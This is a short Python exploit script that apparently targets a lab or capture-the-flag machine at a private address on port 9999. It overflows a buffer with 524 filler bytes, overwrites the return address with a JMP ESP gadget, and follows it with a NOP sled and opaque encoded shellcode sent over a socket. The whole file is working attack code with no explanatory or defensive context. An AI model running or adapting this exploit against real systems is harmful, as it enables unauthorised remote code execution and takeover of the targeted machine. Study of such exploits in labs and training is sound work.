#!/usr/bin/env python3

import socket

host, port = "10.10.89.213", 9999

jmp_esp = b"\xf3\x12\x17\x31"


payload = b"".join([
	b"A" * 524,
])

shellcode =  b""
shellcode += b"\xbf\x40\xed\xc5\x45\xd9\xe9\xd9\x74\x24\xf4"
shellcode += b"\x5d\x31\xc9\xb1\x12\x83\xed\xfc\x31\x7d\x0e"
shellcode += b"\x03\x3d\xe3\x27\xb0\x8c\x20\x50\xd8\xbd\x95"
shellcode += b"\xcc\x75\x43\x93\x12\x39\x25\x6e\x54\xa9\xf0"
shellcode += b"\xc0\x6a\x03\x82\x68\xec\x62\xea\x60\x1f\xb2"
shellcode += b"\x53\x1c\x1d\xbc\xb2\x81\xa8\x5d\x04\x5f\xfb"
shellcode += b"\xcc\x37\x13\xf8\x67\x56\x9e\x7f\x25\xf0\x4f"
shellcode += b"\xaf\xb9\x68\xf8\x80\x12\x0a\x91\x57\x8f\x98"
shellcode += b"\x32\xe1\xb1\xac\xbe\x3c\xb1"






with socket.socket() as s:
	s.connect((host, port))
	s.send(payload + jmp_esp + b"\x90" * 24 + shellcode + b"\r\n")